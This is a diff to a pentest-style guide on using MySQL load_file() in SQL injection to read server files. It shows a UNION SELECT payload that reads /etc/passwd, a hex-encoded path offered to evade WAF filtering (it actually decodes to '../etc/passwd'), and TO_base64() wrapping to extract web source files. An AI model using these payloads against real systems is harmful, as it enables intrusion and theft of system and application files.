@@ -9,7 +9,7 @@ load_file(/path/to/file)
 
 For example, the most basic approach is to read /etc/passwd:  
 ```sql
-load_file('/etc/passwd')
+load_file('../etc/passwd')
 ```
 
 A simple usage of the query:  
@@ -17,6 +17,11 @@ A simple usage of the query:
 http://domain.com/index.php?id=1' Union Select 1,2,3,load_file('/etc/passwd'),5,6,7,8,9,10,11,12-- -
 ```
 
-## WAF Limitation
-Most of WAF detects the **../** which might be used on the absolute path. I did some research and realised that we can't really bypass WAF as it is impossible to obfuscate **../**. Unlike the normal LFI, where you can easily encode to **%2e%2e/etc/passwd%00**, in SQL injection it is not possible to implement that as well, because it will break the SQL syntax (remember that the path is inside a SQL function, so no much flexibility here).
-If you come up with an idea about alternative way of using **../** inside the load_file() function, let me know :)
+Alternatively you can convert **/etc/passwd** in 0xHex Format (in case WAF blocks it, or the backslashes might break up the syntax:  
+```sql
+load_file(0x2e2e2f6574632f706173737764)
+```
+Just like normal LFI, it is possible to convert the content of the file in base64, thanks to **TO_base64()** function:  
+```sql
+TO_base64(LOAD_FILE('/var/www/html/index.php'))  
+```
